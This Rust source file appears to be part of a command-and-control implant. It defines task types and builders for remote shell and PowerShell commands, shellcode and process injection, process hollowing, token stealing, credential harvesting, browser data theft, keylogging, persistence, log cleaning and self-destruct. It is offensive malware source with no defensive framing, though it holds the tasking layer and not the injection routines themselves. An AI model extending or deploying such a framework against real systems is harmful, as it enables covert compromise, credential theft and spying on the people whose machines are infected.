use serde::{Deserialize, Serialize};
use crate::{current_timestamp, generate_uuid};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Task {
    pub id: String,
    pub task_type: TaskType,
    pub created_at: u64,
    pub scheduled_for: Option<u64>,
    pub timeout_seconds: Option<u64>,
    pub priority: u8, // 0-255, higher is more important
    pub retry_count: u8,
    pub max_retries: u8,
    pub status: TaskStatus,
    pub parameters: std::collections::HashMap<String, String>,
    pub result: Option<TaskResult>,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum TaskType {
    ShellCommand,
    PowerShellCommand,
    FileUpload,
    FileDownload,
    DirectoryListing,
    ProcessList,
    SystemInfo,
    NetworkInfo,
    RegistryQuery,
    RegistrySet,
    ServiceControl,
    // Advanced execution methods
    FiberShellcode,
    FiberHollowing,
    ProcessInjection,
    DllInjection,
    ApcInjection,
    EarlyBirdInjection,
    // Persistence
    RegistryPersistence,
    ServicePersistence,
    TaskSchedulerPersistence,
    StartupPersistence,
    // Evasion
    ProcessMigration,
    TokenStealing,
    ProcessHollowing,
    ReflectiveDllLoading,
    // Reconnaissance
    NetworkScan,
    CredentialHarvesting,
    BrowserDataExtraction,
    ScreenCapture,
    KeyloggerStart,
    KeyloggerStop,
    KeyloggerStatus,
    KeyloggerFlush,
    // Cleanup
    SelfDestruct,
    LogCleaning,
    ArtifactRemoval,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum TaskStatus {
    Pending,
    Running,
    Completed,
    Failed,
    Timeout,
    Cancelled,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {
    pub task_id: String,
    pub status: TaskStatus,
    pub output: String,
    pub error_message: Option<String>,
    pub start_time: u64,
    pub end_time: u64,
    pub execution_duration_ms: u64,
    pub exit_code: Option<i32>,
    pub artifacts: Vec<TaskArtifact>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskArtifact {
    pub artifact_type: ArtifactType,
    pub name: String,
    pub data: Vec<u8>,
    pub metadata: std::collections::HashMap<String, String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ArtifactType {
    Screenshot,
    LogFile,
    CredentialDump,
    ProcessDump,
    MemoryDump,
    RegistryDump,
    NetworkCapture,
    FileContent,
    ConfigData,
    Custom(String),
}

impl Task {
    pub fn new(task_type: TaskType) -> Self {
        Self {
            id: generate_uuid(),
            task_type,
            created_at: current_timestamp(),
            scheduled_for: None,
            timeout_seconds: None,
            priority: 100,
            retry_count: 0,
            max_retries: 3,
            status: TaskStatus::Pending,
            parameters: std::collections::HashMap::new(),
            result: None,
        }
    }

    pub fn with_parameter(mut self, key: String, value: String) -> Self {
        self.parameters.insert(key, value);
        self
    }

    pub fn with_timeout(mut self, seconds: u64) -> Self {
        self.timeout_seconds = Some(seconds);
        self
    }

    pub fn with_priority(mut self, priority: u8) -> Self {
        self.priority = priority;
        self
    }

    pub fn with_max_retries(mut self, max_retries: u8) -> Self {
        self.max_retries = max_retries;
        self
    }

    pub fn schedule_for(mut self, timestamp: u64) -> Self {
        self.scheduled_for = Some(timestamp);
        self
    }

    pub fn get_parameter(&self, key: &str) -> Option<&String> {
        self.parameters.get(key)
    }

    pub fn is_ready_to_execute(&self) -> bool {
        if let Some(scheduled_for) = self.scheduled_for {
            current_timestamp() >= scheduled_for
        } else {
            true
        }
    }

    pub fn is_expired(&self) -> bool {
        if let Some(timeout) = self.timeout_seconds {
            (current_timestamp() - self.created_at) > timeout
        } else {
            false
        }
    }

    pub fn can_retry(&self) -> bool {
        self.retry_count < self.max_retries
    }

    pub fn increment_retry(&mut self) {
        self.retry_count += 1;
    }

    pub fn set_status(&mut self, status: TaskStatus) {
        self.status = status;
    }

    pub fn set_result(&mut self, result: TaskResult) {
        self.status = result.status.clone();
        self.result = Some(result);
    }
}

impl TaskResult {
    pub fn success(task_id: String, output: String, start_time: u64) -> Self {
        let end_time = current_timestamp();
        Self {
            task_id,
            status: TaskStatus::Completed,
            output,
            error_message: None,
            start_time,
            end_time,
            execution_duration_ms: ((end_time - start_time) * 1000),
            exit_code: Some(0),
            artifacts: Vec::new(),
        }
    }

    pub fn failure(task_id: String, error: String, start_time: u64) -> Self {
        let end_time = current_timestamp();
        Self {
            task_id,
            status: TaskStatus::Failed,
            output: String::new(),
            error_message: Some(error),
            start_time,
            end_time,
            execution_duration_ms: ((end_time - start_time) * 1000),
            exit_code: Some(-1),
            artifacts: Vec::new(),
        }
    }

    pub fn timeout(task_id: String, start_time: u64) -> Self {
        let end_time = current_timestamp();
        Self {
            task_id,
            status: TaskStatus::Timeout,
            output: String::new(),
            error_message: Some("Task execution timed out".to_string()),
            start_time,
            end_time,
            execution_duration_ms: ((end_time - start_time) * 1000),
            exit_code: Some(-2),
            artifacts: Vec::new(),
        }
    }

    pub fn with_artifact(mut self, artifact: TaskArtifact) -> Self {
        self.artifacts.push(artifact);
        self
    }

    pub fn with_exit_code(mut self, exit_code: i32) -> Self {
        self.exit_code = Some(exit_code);
        self
    }
}

impl TaskArtifact {
    pub fn new(artifact_type: ArtifactType, name: String, data: Vec<u8>) -> Self {
        Self {
            artifact_type,
            name,
            data,
            metadata: std::collections::HashMap::new(),
        }
    }

    pub fn with_metadata(mut self, key: String, value: String) -> Self {
        self.metadata.insert(key, value);
        self
    }

    pub fn screenshot(name: String, data: Vec<u8>) -> Self {
        Self::new(ArtifactType::Screenshot, name, data)
    }

    pub fn log_file(name: String, data: Vec<u8>) -> Self {
        Self::new(ArtifactType::LogFile, name, data)
    }

    pub fn credential_dump(name: String, data: Vec<u8>) -> Self {
        Self::new(ArtifactType::CredentialDump, name, data)
    }

    pub fn process_dump(name: String, data: Vec<u8>) -> Self {
        Self::new(ArtifactType::ProcessDump, name, data)
    }

    pub fn file_content(name: String, data: Vec<u8>) -> Self {
        Self::new(ArtifactType::FileContent, name, data)
    }
}

// Task builder patterns for common task types
pub struct TaskBuilder;

impl TaskBuilder {
    pub fn shell_command(command: String) -> Task {
        Task::new(TaskType::ShellCommand)
            .with_parameter("command".to_string(), command)
            .with_timeout(300) // 5 minutes default timeout
    }

    pub fn powershell_command(command: String) -> Task {
        Task::new(TaskType::PowerShellCommand)
            .with_parameter("command".to_string(), command)
            .with_timeout(300)
    }

    pub fn fiber_shellcode(shellcode_b64: String) -> Task {
        Task::new(TaskType::FiberShellcode)
            .with_parameter("shellcode".to_string(), shellcode_b64)
            .with_parameter("method".to_string(), "direct_fiber".to_string())
            .with_timeout(60)
            .with_priority(200)
    }

    pub fn fiber_hollowing(shellcode_b64: String, target_process: String) -> Task {
        Task::new(TaskType::FiberHollowing)
            .with_parameter("shellcode".to_string(), shellcode_b64)
            .with_parameter("target_process".to_string(), target_process)
            .with_parameter("method".to_string(), "process_hollowing".to_string())
            .with_timeout(120)
            .with_priority(250)
    }

    pub fn process_injection(shellcode_b64: String, target_pid: u32) -> Task {
        Task::new(TaskType::ProcessInjection)
            .with_parameter("shellcode".to_string(), shellcode_b64)
            .with_parameter("target_pid".to_string(), target_pid.to_string())
            .with_timeout(60)
            .with_priority(200)
    }

    pub fn file_download(file_path: String) -> Task {
        Task::new(TaskType::FileDownload)
            .with_parameter("path".to_string(), file_path)
            .with_timeout(600) // 10 minutes for large files
    }

    pub fn file_upload(file_path: String, content_b64: String) -> Task {
        Task::new(TaskType::FileUpload)
            .with_parameter("path".to_string(), file_path)
            .with_parameter("content".to_string(), content_b64)
            .with_timeout(600)
    }

    pub fn directory_listing(path: String) -> Task {
        Task::new(TaskType::DirectoryListing)
            .with_parameter("path".to_string(), path)
            .with_timeout(30)
    }

    pub fn process_list() -> Task {
        Task::new(TaskType::ProcessList)
            .with_timeout(30)
    }

    pub fn system_info() -> Task {
        Task::new(TaskType::SystemInfo)
            .with_timeout(60)
    }

    pub fn network_info() -> Task {
        Task::new(TaskType::NetworkInfo)
            .with_timeout(30)
    }

    pub fn registry_query(key_path: String, value_name: Option<String>) -> Task {
        let mut task = Task::new(TaskType::RegistryQuery)
            .with_parameter("key_path".to_string(), key_path)
            .with_timeout(30);
        
        if let Some(value) = value_name {
            task = task.with_parameter("value_name".to_string(), value);
        }
        
        task
    }

    pub fn registry_set(key_path: String, value_name: String, value_data: String, value_type: String) -> Task {
        Task::new(TaskType::RegistrySet)
            .with_parameter("key_path".to_string(), key_path)
            .with_parameter("value_name".to_string(), value_name)
            .with_parameter("value_data".to_string(), value_data)
            .with_parameter("value_type".to_string(), value_type)
            .with_timeout(30)
    }

    pub fn screen_capture() -> Task {
        Task::new(TaskType::ScreenCapture)
            .with_timeout(30)
    }

    pub fn network_scan(target_range: String, ports: String) -> Task {
        Task::new(TaskType::NetworkScan)
            .with_parameter("target_range".to_string(), target_range)
            .with_parameter("ports".to_string(), ports)
            .with_timeout(300)
    }

    pub fn credential_harvesting() -> Task {
        Task::new(TaskType::CredentialHarvesting)
            .with_timeout(120)
            .with_priority(150)
    }

    pub fn browser_data_extraction() -> Task {
        Task::new(TaskType::BrowserDataExtraction)
            .with_timeout(180)
    }

    pub fn registry_persistence(key_path: String, value_name: String, executable_path: String) -> Task {
        Task::new(TaskType::RegistryPersistence)
            .with_parameter("key_path".to_string(), key_path)
            .with_parameter("value_name".to_string(), value_name)
            .with_parameter("executable_path".to_string(), executable_path)
            .with_timeout(30)
            .with_priority(180)
    }

    pub fn keylogger_start() -> Task {
        Task::new(TaskType::KeyloggerStart)
            .with_timeout(30)
            .with_priority(200)
    }

    pub fn keylogger_stop() -> Task {
        Task::new(TaskType::KeyloggerStop)
            .with_timeout(30)
            .with_priority(200)
    }

    pub fn keylogger_status() -> Task {
        Task::new(TaskType::KeyloggerStatus)
            .with_timeout(10)
            .with_priority(100)
    }

    pub fn keylogger_flush() -> Task {
        Task::new(TaskType::KeyloggerFlush)
            .with_timeout(30)
            .with_priority(150)
    }

    pub fn self_destruct(delay_seconds: Option<u64>) -> Task {
        let mut task = Task::new(TaskType::SelfDestruct)
            .with_timeout(60)
            .with_priority(255);

        if let Some(delay) = delay_seconds {
            task = task.with_parameter("delay_seconds".to_string(), delay.to_string());
        }

        task
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_task_creation() {
        let task = Task::new(TaskType::ShellCommand);
        assert_eq!(task.task_type, TaskType::ShellCommand);
        assert_eq!(task.status, TaskStatus::Pending);
        assert!(!task.id.is_empty());
    }

    #[test]
    fn test_task_builder() {
        let task = TaskBuilder::shell_command("whoami".to_string());
        assert_eq!(task.task_type, TaskType::ShellCommand);
        assert_eq!(task.get_parameter("command"), Some(&"whoami".to_string()));
        assert_eq!(task.timeout_seconds, Some(300));
    }

    #[test]
    fn test_task_ready_to_execute() {
        let task = Task::new(TaskType::ShellCommand);
        assert!(task.is_ready_to_execute());

        let future_task = Task::new(TaskType::ShellCommand)
            .schedule_for(current_timestamp() + 3600);
        assert!(!future_task.is_ready_to_execute());
    }

    #[test]
    fn test_task_result() {
        let result = TaskResult::success(
            "task-123".to_string(),
            "output".to_string(),
            current_timestamp() - 1,
        );
        assert_eq!(result.status, TaskStatus::Completed);
        assert_eq!(result.output, "output");
        assert!(result.execution_duration_ms > 0);
    }

    #[test]
    fn test_fiber_shellcode_task() {
        let task = TaskBuilder::fiber_shellcode("base64_shellcode".to_string());
        assert_eq!(task.task_type, TaskType::FiberShellcode);
        assert_eq!(task.get_parameter("shellcode"), Some(&"base64_shellcode".to_string()));
        assert_eq!(task.get_parameter("method"), Some(&"direct_fiber".to_string()));
        assert_eq!(task.priority, 200);
    }
}
